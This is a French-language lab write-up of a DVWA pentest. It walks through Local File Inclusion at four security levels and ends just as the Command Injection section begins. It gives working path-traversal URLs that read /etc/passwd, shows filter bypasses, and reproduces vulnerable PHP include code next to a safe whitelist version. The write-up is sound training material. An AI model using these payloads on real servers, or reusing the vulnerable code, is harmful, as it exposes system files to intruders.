# Pentest en utilisant DVWA  

>author : Sacha Besser  
  
# 1. Local File Inclusion
Une Local File Inclusion (LFI) est une vulnérabilité web qui permet à un attaquant de forcer un site à inclure et afficher des fichiers locaux présents sur le serveur.  

Cette faille se produit lorsque le site web inclut un fichier sans bien vérifier ou filtrer ce que l’utilisateur peut choisir.  

Par exemple, un site utilise une URL comme :
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=file.php
```
Ici, le fichier file.php est inclus par la variable page.  

Si l’entrée utilisateur n'est pas sécurisée, un attaquant pourrait manipuler l'URL pour inclure d'autres fichiers locaux :
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
```
## 1.1 Premier niveau – low
Nous avons une page toute simple avec trois fichiers` http://34.163.97.167/DVWA/vulnerabilities/fi/?page=include.php `  

![image](images/lfi/1.png)  

Nous allons donc simplement essayer de modifier le parametre pour inclure une autre page par exemple `/etc/passwd`  
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
```
![image](images/lfi/2.png)  

On voit que la faille est bien présente puisqu’elle permet d’afficher n’importe quel fichier sur le serveur.  
On peut donc en quelque sorte en déduire le code php qui est présent sur le serveur.    
```
<?php  
$page = $_GET['page'];
include($page); ?>
```
Cela serait probablement quelque chose comme affiche ci-dessus. C’est-à-dire un simple paramètre `GET` sans aucune structure de contrôle.

## 1.2 Deuxieme niveau - medium

Pour cette deuxieme partie, nous effectuons quelque test et nous pouvons remarquer que `../` est filtre.  
Par Exemple :  
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=../etc/passwd
```
Le resultat ci dessous montre que les `..` ont ete filtre, ainsi le serveur n'a pas affiche le fichier que l'on voulait.
![image](images/lfi/3.png)  

C'est donc assez facile ici de contourner le filtre, il suffit juste de ne pas utiliser `..`, par exemple nous pouvons acceder a la racine simplement en utilisant `/`.

Ainsi en utilisant la meme commande, on arrive a la solution :  
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
```
![image](images/lfi/2.png)

On peux donc en deduire ce que le serveur a comme code :  
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );

?>
```
Pour se faire nous allons voir la configuration de `dvwa` et on remarque que notre hypthese etait bonne, les `../` sont bien filtre mais aussi les `http://` et `https://` qui sont retires et remplaces par une chaine vide.
## 1.3 Troisieme niveau - high
Pour la troisieme partie on va reessayer d'executer la meme commande pour voir comment le serveur reagis
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
```
Cette fois ci le serveur ne nous affiche pas le fichier voulus, mais la phrase `ERROR: File not found!`

Il doit donc y avoir encore plus de filtre ou une strucuture de controle qui a ete ajoute

Ici, n'ayant pas vraiment d'idee pour trouver la solution nous sommes alles directement voir le code php pour comprendre ce que le serveur filtrait ou non.  

```
<?php

$file = $_GET['page'];

if( !fmatch( "file", $file ) && $file != "include.php" ) {
  // This isn't the page we want!
  echo "ERROR: File not found!";
  exit;
}

?>
```
On peux voir que le serveur verifie si le fichier que l'on recupere commence par `"file"`, ceci est en principe une bonne idee puisque les fichiers etant nomme `file1.php`, `file2.php` ..., le script est cense filtre tous les autres. 

Or en ayant compris cela, on en deduis que si on commence chaque "injection" par `file`, on contournera le filtre.  

Par exemple essayons ceci :  
```
http://34.163.97.167/DVWA/vulnerabilities/fi/?page=file/../../../../../../../../../etc/passwd
```

Et encore une fois, nous arrivons a afficher le resultat de `/etc/passwd`.  

![imaegs](/images/lfi/4.png)

## 1.4 Niveau Impossible

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
$configFileNames = [
    'include.php',
    'file1.php',
    'file2.php',
    'file3.php',
];

if( !in_array($file, $configFileNames) ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```
Analysons rapidement ce code.  
Le fichier est recupere dans la variable `file` puis on voit qu'il est compare a une liste contenant tous les fichiers. C'est clairement la meilleure methode puisque ici, soit le nom du fichier est egale a celui qui est dans la liste et le fichier est affiche ou il ne l'est pas et alors le message `ERROR : File not found` est affiche.

# 2. Command Injection

La Command Injection est une vulnérabilité de sécurité où un attaquant peut injecter et exécuter des commandes système dans une application, souvent via une interface utilisateur. Cette vulnérabilité permet à un attaquant d'exécuter des commandes directement sur le serveur ou la machine hôte qui exécute l'application.

Lorsqu'une application prend des données en entrée de l'utilisateur (par exemple via un formulaire web) et les utilise sans validation ou filtre, un attaquant peut insérer une commande système malveillante dans l'entrée. Si l'application passe cette entrée directement à un interpréteur de commande (comme le shell Linux), l'attaquant peut exécuter des commandes non autorisées sur le serveur.

## 2.1 Premier niveau - low
